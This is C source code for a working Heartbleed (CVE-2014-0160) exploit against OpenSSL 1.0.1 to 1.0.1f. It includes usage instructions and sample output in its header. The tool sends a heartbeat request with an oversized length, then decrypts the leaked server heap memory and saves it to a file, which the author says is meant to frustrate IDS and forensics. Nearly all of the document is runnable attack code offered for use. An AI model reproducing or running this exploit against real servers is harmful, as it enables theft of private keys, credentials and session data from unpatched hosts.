/* 
* CVE-2014-0160 heartbleed TLS/DTLS information leak exploit
* ==========================================================
* This exploit uses OpenSSL to create an encrypted connection
* and trigger the heartbleed leak. The leaked information is
* returned encrypted and is then decrypted, decompressed and
* wrote to a file to annoy IDS/forensics. The exploit can set 
* the heatbeart payload length arbitrarily or use two preset 
* values for 0x00 and MAX length. The vulnerability occurs due 
* to bounds checking not being performed on a heap value which 
* is user supplied and returned to the user as part of DTLS/TLS 
* heartbeat SSL extension. All versions of OpenSSL 1.0.1 to 
* 1.0.1f are known affected. You must run this against a target 
* which is linked to a vulnerable OpenSSL library using DTLS/TLS.
*
* Compiled on ArchLinux x86_64 gcc 4.8.2 20140206 w/OpenSSL 1.0.1g 
*
* E.g.
* $ gcc -lssl -lssl3 -lcrypto heartbleed.c -o heartbleed
* $ ./heartbleed -s 192.168.11.9 -p 443 -f leakme -t 65535
* [ heartbleed - CVE-2014-0160 - TLS/DTLS information leak exploit
* [ connecting to 192.168.11.9 443/tcp
* [ connected to 192.168.11.9 443/tcp
* [ setting heartbeat payload_length to 65535
* [ heartbeat returned type=24 length=16416
* [ decrypting and decompressing SSL packet
* [ final record type=24, length=16384
* [ wrote 16384 bytes to file 'leakme'
* [ done.
* $ hexdump -C leakme
* - snip - snip  
*
* todo:
* - udp/dtls support
* - send some "pre-cmds" before handshake, e.g. "STARTTLS"
*
* - Hacker Fantastic
*   http://www.mdsec.co.uk
*
*/
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <signal.h>
#include <netdb.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <inttypes.h>
#include <openssl/bio.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/tls1.h>
#include <openssl/rand.h>
#include <openssl/buffer.h>

#define n2s(c,s)((s=(((unsigned int)(c[0]))<< 8)| \
		(((unsigned int)(c[1]))    )),c+=2)
#define s2n(s,c) ((c[0]=(unsigned char)(((s)>> 8)&0xff), \
		 c[1]=(unsigned char)(((s)    )&0xff)),c+=2)

typedef struct {
	int socket;
	SSL *sslHandle;
	SSL_CTX *sslContext;
} connection;

typedef struct {
  unsigned char type;
  short version;
  unsigned int length;
  unsigned char hbtype;
  unsigned int payload_length;
  void* payload;
} heartbeat;

int tcp_connect(char* server,int port){
	int sd,ret;
	struct hostent *host;
        struct sockaddr_in sa;
        host = gethostbyname(server);
        sd = socket(AF_INET, SOCK_STREAM, 0);
        if(sd==-1){
		printf("[!] cannot create socket\n");
		exit(0);
	}
	sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        sa.sin_addr = *((struct in_addr *) host->h_addr);
        bzero(&(sa.sin_zero),8);
	printf("[ connecting to %s %d/tcp\n",server,port);
        ret = connect(sd,(struct sockaddr *)&sa, sizeof(struct sockaddr));
	if(ret==0){
		printf("[ connected to %s %d/tcp\n",server,port);
	}
	else{
		printf("[!] FATAL: could not connect to %s %d/tcp\n",server,port);
		exit(0);
	}
	return sd;
}

void ssl_init(){
        SSL_load_error_strings();
        SSL_library_init();
        OpenSSL_add_all_digests();
        OpenSSL_add_all_algorithms();
        OpenSSL_add_all_ciphers();
}

connection* tls_connect(int sd){
        connection *c;
	c = malloc(sizeof(connection));
        c->socket = sd;
        c->sslHandle = NULL;
        c->sslContext = NULL;
        c->sslContext = SSL_CTX_new(TLSv1_client_method());
        if(c->sslContext==NULL)
                ERR_print_errors_fp(stderr);
        c->sslHandle = SSL_new(c->sslContext);
        if(c->sslHandle==NULL)
                ERR_print_errors_fp(stderr);
        if(!SSL_set_fd(c->sslHandle,c->socket))
                ERR_print_errors_fp(stderr);
        if(SSL_connect(c->sslHandle)!=1)
                ERR_print_errors_fp(stderr);
        if(!c->sslHandle->tlsext_heartbeat & SSL_TLSEXT_HB_ENABLED ||
                c->sslHandle->tlsext_heartbeat & SSL_TLSEXT_HB_DONT_SEND_REQUESTS){
                printf("[ warning: heartbeat extension is unsupported (try anyway)\n");
        }
	return c;
}

int pre_cmd(int sd){
	// this is a stub function, you can send additional commands to your socket
	// here before the heartbleed exploit.
	return sd;
}

void* heartbleed(connection *c,unsigned int type){
	unsigned char *buf, *p;
        int ret;
	buf = OPENSSL_malloc(1 + 2);
        p = buf;
        *p++ = TLS1_HB_REQUEST;
	switch(type){
		case 0:
			s2n(0x0,p);
			break;
		case 1:
			s2n(0xffff,p);
			break;
		default:
			printf("[ setting heartbeat payload_length to %u\n",type);
			s2n(type,p);
			break;
	}
        ret = ssl3_write_bytes(c->sslHandle, TLS1_RT_HEARTBEAT, buf, 3);
        OPENSSL_free(buf);
	return c;
}

void* sneakyleaky(connection *c,char* filename, int verbose){
	char *p;
        int ssl_major,ssl_minor,al;
        int enc_err,n,i;
        SSL3_RECORD *rr;
        SSL_SESSION *sess;
	SSL* s;
        unsigned char md[EVP_MAX_MD_SIZE];
        short version;
        unsigned mac_size, orig_len;
        size_t extra;
        rr= &(c->sslHandle->s3->rrec);
        sess=c->sslHandle->session;
        s = c->sslHandle;
        if (c->sslHandle->options & SSL_OP_MICROSOFT_BIG_SSLV3_BUFFER)
                extra=SSL3_RT_MAX_EXTRA;
        else
                extra=0;
        if ((s->rstate != SSL_ST_READ_BODY) ||
                (s->packet_length < SSL3_RT_HEADER_LENGTH)) {
                        n=ssl3_read_n(s, SSL3_RT_HEADER_LENGTH, s->s3->rbuf.len, 0);
                        if (n <= 0)
                                goto apple; 
                        s->rstate=SSL_ST_READ_BODY;
                        p=s->packet;
                        rr->type= *(p++);
                        ssl_major= *(p++);
                        ssl_minor= *(p++);
                        version=(ssl_major<<8)|ssl_minor;
                        n2s(p,rr->length);
			if(rr->type==24){
				printf("[ heartbeat returned type=%d length=%u\n",rr->type, rr->length);
			}
			else{
				printf("[!] FATAL: incorrect record type=%d returned\n",rr->type);
				exit(0);
			}
        }
        if (rr->length > s->packet_length-SSL3_RT_HEADER_LENGTH){
                i=rr->length;
                n=ssl3_read_n(s,i,i,1);
                if (n <= 0) goto apple; 
        }
	printf("[ decrypting and decompressing SSL packet\n");
        s->rstate=SSL_ST_READ_HEADER; 
        rr->input= &(s->packet[SSL3_RT_HEADER_LENGTH]);
        rr->data=rr->input;
        tls1_enc(s,0);
        if(verbose==1){
                { unsigned int z; for (z=0; z<rr->length; z++) printf("%02X%c",rr->data[z],((z+1)%16)?' ':'\n'); }
                printf("\n");
        }
        if((sess != NULL) &&
            (s->enc_read_ctx != NULL) &&
            (EVP_MD_CTX_md(s->read_hash) != NULL))
                {
                unsigned char *mac = NULL;
                unsigned char mac_tmp[EVP_MAX_MD_SIZE];
                mac_size=EVP_MD_CTX_size(s->read_hash);
                OPENSSL_assert(mac_size <= EVP_MAX_MD_SIZE);
                orig_len = rr->length+((unsigned int)rr->type>>8);
                if(orig_len < mac_size ||
                  (EVP_CIPHER_CTX_mode(s->enc_read_ctx) == EVP_CIPH_CBC_MODE &&
                   orig_len < mac_size+1)){
                        al=SSL_AD_DECODE_ERROR;
                        SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_LENGTH_TOO_SHORT);
                }
                if (EVP_CIPHER_CTX_mode(s->enc_read_ctx) == EVP_CIPH_CBC_MODE){
                        mac = mac_tmp;
                        ssl3_cbc_copy_mac(mac_tmp, rr, mac_size, orig_len);
                        rr->length -= mac_size;
                }
                else{
                        rr->length -= mac_size;
                        mac = &rr->data[rr->length];
                }
                i = tls1_mac(s,md,0);
                if (i < 0 || mac == NULL || CRYPTO_memcmp(md, mac, (size_t)mac_size) != 0)
                        enc_err = -1;
                if (rr->length > SSL3_RT_MAX_COMPRESSED_LENGTH+extra+mac_size)
                        enc_err = -1;
                }
        if(enc_err < 0){
                al=SSL_AD_BAD_RECORD_MAC;
                SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_DECRYPTION_FAILED_OR_BAD_RECORD_MAC);
                goto apple;
        }
        if(s->expand != NULL){
                if (rr->length > SSL3_RT_MAX_COMPRESSED_LENGTH+extra) {
                        al=SSL_AD_RECORD_OVERFLOW;
                        SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_COMPRESSED_LENGTH_TOO_LONG);
                        goto apple;
                        }
                if (!ssl3_do_uncompress(s)) {
                        al=SSL_AD_DECOMPRESSION_FAILURE;
                        SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_BAD_DECOMPRESSION);
                        goto apple;
                        }
                }
        if (rr->length > SSL3_RT_MAX_PLAIN_LENGTH+extra) {
                al=SSL_AD_RECORD_OVERFLOW;
                SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_DATA_LENGTH_TOO_LONG);
                goto apple;
        }
        rr->off=0;
        s->packet_length=0;
	printf("[ final record type=%d, length=%u\n", rr->type, rr->length);
	int fd = open(filename,O_RDWR|O_CREAT,0700);
        write(fd,s->s3->rrec.data,s->s3->rrec.length);
        close(fd);
	printf("[ wrote %d bytes to file '%s'\n",rr->length, filename);
	printf("[ done.\n");
        exit(0);
apple:
        printf("[!] FATAL: problem occured handling SSL record packet\n");
	exit(0);
}

void usage(){
	printf("[\n");
	printf("[ --server|-s <ip/dns>    - the server to target\n");
	printf("[ --port|-p   <port>      - the port to target\n");
	printf("[ --file|-f   <filename>  - file to write data to\n");
	printf("[ --type|-t               - select exploit to try\n");
	printf("[                           0 = null length\n");
	printf("[			    1 = max leak\n");
	printf("[			    n = heartbeat payload_length\n");
	printf("[\n");
	printf("[ --verbose|-v            - output leak to screen\n");
	printf("[ --help|-h               - this output\n");
	printf("[\n");
	exit(0);
}

int main(int argc, char* argv[]){
	int ret, port, userc, index;
	int type = 1, udp = 0, verbose = 0;
	struct hostent *h;
	connection* c;
	char *host, *file;
	int ihost = 0, iport = 0, ifile = 0, itype = 0;
	printf("[ heartbleed - CVE-2014-0160 - TLS/DTLS information leak exploit\n");
        static struct option options[] = {
        	{"server", 1, 0, 's'},
	        {"port", 1, 0, 'p'},
		{"file", 1, 0, 'f'},
		{"type", 1, 0, 't'},
		{"verbose", 0, 0, 'v'},
		{"help", 0, 0,'h'}
        };
	while(userc != -1) {
	        userc = getopt_long(argc,argv,"s:p:f:t:vh",options,&index);	
        	switch(userc) {
               		case -1:
	                        break;
        	        case 's':
				if(ihost==0){
					ihost = 1;
					h = gethostbyname(optarg);				
					if(h==NULL){
						printf("[!] FATAL: unknown host '%s'\n",optarg);
						exit(1);
					}
					host = malloc(strlen(optarg) + 1);
					sprintf(host,"%s",optarg);
               			}
				break;
	                case 'p':
				if(iport==0){
					port = atoi(optarg);
					iport = 1;
				}
                	        break;
			case 'f':
				if(ifile==0){
					file = malloc(strlen(optarg) + 1);
					sprintf(file,"%s",optarg);
					ifile = 1;
				}
				break;
			case 't':
				if(itype==0){
					type = atoi(optarg);
					itype = 1;
				}
				break;
			case 'h':
				usage();
				break;
			case 'v':
				verbose = 1;
				break;
			default:
				break;
		}
	}
	if(ihost==0||iport==0||ifile==0||itype==0){
		printf("[ try --help\n");
		exit(0);
	}
	ssl_init();
	ret = tcp_connect(host, port);
	pre_cmd(ret);
	c = tls_connect(ret);
	heartbleed(c,type);
	sneakyleaky(c,file,verbose);
}
